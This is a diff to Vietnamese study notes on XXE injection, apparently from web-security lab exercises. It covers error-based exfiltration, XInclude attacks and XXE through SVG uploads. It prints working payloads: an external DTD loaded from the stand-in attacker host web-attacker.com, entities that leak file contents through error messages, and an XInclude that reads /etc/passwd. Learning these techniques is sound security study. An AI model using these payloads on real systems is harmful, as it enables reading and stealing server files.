@@ -36,11 +36,17 @@ Một số ứng dụng sử dụng định dạng XML để truyền dữ liệ
     - Sử dụng `exfiltrate` để giá trị của nó được đánh giá: `%exfiltrate;`
   - Cuối cùng, tấn công gửi XXE: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
 "http://web-attacker.com/malicious.dtd"> %xxe;]>`
+
 - Khai thác để truy xuất dữ liệu qua các thông báo lỗi (lab 6)
+  - Định nghĩa `file` chứa nội dung của file đã cho: `<!ENTITY % file SYSTEM "file:///file_đã_cho">`
+  - Định nghĩa `eval` chứa `error` (được đánh giá bằng cách tải 1 tệp không tồn tại có chứa giá trị của `file`): `<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">`
+    
 - lab 7 EXPERT
 
 ## [**_6. Tìm bề mặt tấn công ẩn để thực hiện XXEi_**](part3.md)
 - Tấn công XInclude (lab 8)
+  - XInclude là một phần của đặc tả XML cho phép xây dựng một tài liệu XML từ các tài liệu phụ. Bạn có thể thực hiện một cuộc tấn công XInclude bên trong bất kỳ giá trị dữ liệu nào trong tài liệu XML, do đó cuộc tấn công có thể được thực hiện trong các tình huống mà bạn chỉ kiểm soát một mục dữ liệu duy nhất được đặt vào tài liệu XML phía máy chủ.
+    
   - tham chiếu tên và cung cấp đường dẫn đến tệp muốn đưa vào:
 
       > `<foo xmlns:xi="http://www.w3.org/2001/XInclude">`
@@ -48,4 +54,7 @@ Một số ứng dụng sử dụng định dạng XML để truyền dữ liệ
       > `<xi:include parse="text" href="file:///etc/passwd"/></foo>`
       
 - Thông qua upload file (lab 9)
+  - Một số ứng dụng cho phép người dùng tải lên các tệp sau đó được xử lý phía máy chủ. Một số định dạng tệp phổ biến sử dụng XML hoặc chứa các thành phần phụ XML. Ví dụ về các định dạng dựa trên XML là các định dạng tài liệu văn phòng như DOCX và các định dạng hình ảnh như SVG.
+  - Ví dụ: một ứng dụng có thể cho phép người dùng tải hình ảnh lên và xử lý hoặc xác thực những hình ảnh này trên máy chủ sau khi chúng được tải lên. Ngay cả khi ứng dụng mong muốn nhận được định dạng như PNG hoặc JPEG, thư viện xử lý hình ảnh đang được sử dụng có thể hỗ trợ hình ảnh SVG. Vì định dạng SVG sử dụng XML nên kẻ tấn công có thể gửi hình ảnh SVG độc hại và do đó tiếp cận bề mặt tấn công ẩn để tìm lỗ hổng XXE.
+
 - Thông qua chỉnh sửa Content-type
